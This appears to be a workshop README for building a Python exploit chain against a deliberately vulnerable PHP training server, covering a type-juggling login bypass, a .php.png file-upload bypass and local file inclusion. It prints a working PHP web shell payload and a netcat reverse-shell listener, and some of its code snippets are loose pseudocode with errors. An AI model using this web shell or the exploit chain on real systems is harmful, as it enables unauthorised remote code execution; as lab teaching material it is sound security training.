# JuggleMe

## Link to download Vulnerable server
https://drive.google.com/file/d/1D79WJ7gtECDag9_kxquUoUGX4fDHaJ-t/view?usp=sharing

Find your IP address of the application by running nmap:
	
	nmap -p80 SUBNET --open

If you do not have VMware Fusion or VMware Workstation the application is available at http://da45-107-181-178-100.ngrok.io/Login.php.  You will need to install ngrok to receive your reverse shell and will have to either modify the script or set up ngrok with a netcat listener on the side.  You can sign up and download ngrok here: https://ngrok.com/ .  If you decided to use the hosted application, please be sure to use a unique name for your webshell.

	ngrok config add-authtoken TOKEN 
	ngrok tcp LPORT

The script we will be creating will be done in Python.  You'll need to pip install the libraries in use. 
##Requirements

	pip install requests
	pip install pyfiglet
	pip install time
	pip install subprocess
	pip install argparse

# Vulnerabilities
* PHP Type Juggling - Authentication Bypass
* File Upload - Remote Code Execution and File Extension Bypass
* Local File Inclusion - Executing Extension Bypass technique

## PHP Type Juggling
* PHP Loose Comparison - https://www.php.net/manual/en/types.comparisons.php
* Owasp Type Juggling - https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
* PHP Magic Hashes - https://github.com/spaze/hashes

Vulnerable Code : https://gist.github.com/dreamcast65/1d7fd96893d70d4c85e649b358e47dbc#file-loose-comparison

## File Upload
* File Extension Bypass Cheat Sheet - https://book.hacktricks.xyz/pentesting-web/file-upload
* One Line Reverse Shells to input into a webshell - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

While it may be beneficial to test for other types of file extension bypasses the bypass we will use for this workshop will be .php.png

Vulnerable Code : https://gist.github.com/dreamcast65/c91bd12384d33b2fb4067cd9bc989be0#file-file-upload-bypass
        
Code To make a webshell:

    uploaded_file = "shell.php.png"
    files = {'image':(uploaded_file, "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd =($_REQUEST['cmd']);system($cmd);echo \"</pre>\";die;}?>")
	    }
        
## Local file Inclusion
* Owasp LFI - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
* LFI cheatsheet - https://highon.coffee/blog/lfi-cheat-sheet/

Vulnerable Code : https://gist.github.com/dreamcast65/4dbddb89d75eec29383b8497d615eaa3#file-local-file-inclusion

## Important Python Libraries
* Requests - https://requests.readthedocs.io/en/latest/

We will be using the Requests library to create a session object to make GET and POST requests which we will use to log in, upload a file, and access that file.

* Subprocess - https://docs.python.org/3/library/subprocess.html

We will use Subprocess to execute and receive our reverse shell without having to start a netcat listener in another terminal.

* Time - https://docs.python.org/3/library/time.html

The time library will only be used to wait a few seconds for requests and responses to come back.

* Argparse - https://docs.python.org/3/library/argparse.html

This will be used for parsing arguments.

## Useful Burp Extension
* Copy As Python-Requests - https://portswigger.net/bappstore/b324647b6efa4b6a8f346389730df160

# Time To Code

### Starting code

	#!/usr/bin/python
	import argparse
	import pyfiglet
	import requests
	import time
	import subprocess
	proxies={
	'http':'http://127.0.0.1:8081'
	}
	banner = pyfiglet.figlet_format("Optiv Source Zero Con")
	print(banner)
	print('Chained RCE exploit')
	print('JuggleMe v 0.1.0')

	loaded_file = "shell.php.png"
	files = {'image':(uploaded_file, "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd =($_REQUEST['cmd']);system($cmd);echo \"</pre>\";die;}?>")
	}
	class Exploit:

## def __init__ 
A Sample class with __init__ method.  This is similar to a constructor in C++ and Java and will help with our arguments.
    
    class Person:  

    # init method or constructor   
    def __init__(self, name):  
        self.name = name  
      
    # Sample Method   
    def say_hi(self):  
        print('Hello, my name is', self.name)  
      
    p = Person('Nikhil')  
    p.say_hi() 
## def exploitation(self):


This segment of code will be the meat of what we are trying to get done.  We will first need to create a session.  Then from there we will need to make a post request with the login data required to successfully log in.  From there, we will be uploading a file that will be a web shell.  After that we will be creating a listener with netcat and then using the LFI vulnerability to navigate to the webshell that we have uploaded with a one line reverse shell to execute a callback to our listener.

### Session - Requests
Conditional Statements and Time

It may be good to add conditional statements to see if the request was a success or not. Putting a pause in between requests as well.

	if(r.status_code = 200)
		print("Success");
	else
		print("Fail");
		quit()
	time.sleep
	
Variables
	
	variables ={
		"username":login,
		"password":password,
		"etc":etc
		....
		....
		}
Session

	r = requests.Session();
GET

	r1 = r.get(url);

POST

	r2 = r.post(url, data=variables)
UPLOAD

	r.post(url, files=files) // files above under file upload vulnerability
Proxies

	proxies={
	'http':'http://127.0.0.1:8081'
	}
It may be beneficial to add proxies to the POST requests if you'd like to intercept a request with burp and inspect that it looks like the POST request you are expecting.	
### Reverse Shell and Listener

	listener = subprocess.Popen(["nc", "-nvlp", self.localport])
Now that the listener is started run a GET request to execute a one line reverse shell.  After that Get request you can have the listener wait.  If it doesn't work, you can terminate the listener.
	
	listener.wait()
OR

	listener.terminate()
	
## def get_args():

	parser = argparse.ArgumentParser(description='JuggleMe v 0.1.0 - Remote Code Execution (RCE) (Authenticated)')
	parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP') //add all arguments you will need
	args= parser.parse_args()
	return args
	
## Execution
	
	args = get_args()
	target_ip = args.url // map whatever arguments to variables to plug into our exploit class
	
	exp = Exploit(target_ip, other_args)
	exp.exploitation()
